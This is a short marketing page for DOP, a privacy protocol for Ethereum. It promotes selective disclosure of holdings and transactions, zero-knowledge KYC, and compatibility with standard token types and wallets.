THE DILEMMA
  • Existing public blockchains mandate full transparency by default - with all user data visible.
  • This provides no individual control over data exposure - an all or nothing lack of choice.
  • Enables bad actors exploiting over-transparency through fronts-running, “whale-watching”, and phishing.
THE DOP APPROACH
  • Users can selectively disclose holdings, transactions, activity details.
  • Seamless integration supporting ERC20, ERC721 and ERC1155 assets.
  • Maintains seamless integration with wallets, EVMs and dApps.
ADVANTAGES OVER EXISTING OPTIONS

DOP aims to move beyond the limitations of current privacy approaches by

BRINGING DATA OWNERSHIP TO ETHEREUM

Bringing flexible data ownership capabilities natively to Ethereum apps and infrastructure rather than requiring specialized third party tools

DATA CONTROL

Enabling user control over what personal data points get shared publicly rather than all-or-nothing disclosure

ZERO-KNOWLEDGE KYC

Supporting anonymized identity verification through zero-knowledge KYC instead of traditional invasive checks

CUSTOMISED DATA DISCLOSURE

Allowing customized disclosure permissions tailored to each app and context vs rigid single policies

ECOSYSTEM DEVELOPMENT

Fostering ecosystem integration by design through open standards vs closed models, inviting developers to build dApps on DOP

The protocol values individual consent first, while ensuring compliance needs are still met through selective transparency. Compared to existing options that deliver either complete exposure or absolute anonymity, DOP strikes an optimal balance empowering users with control.
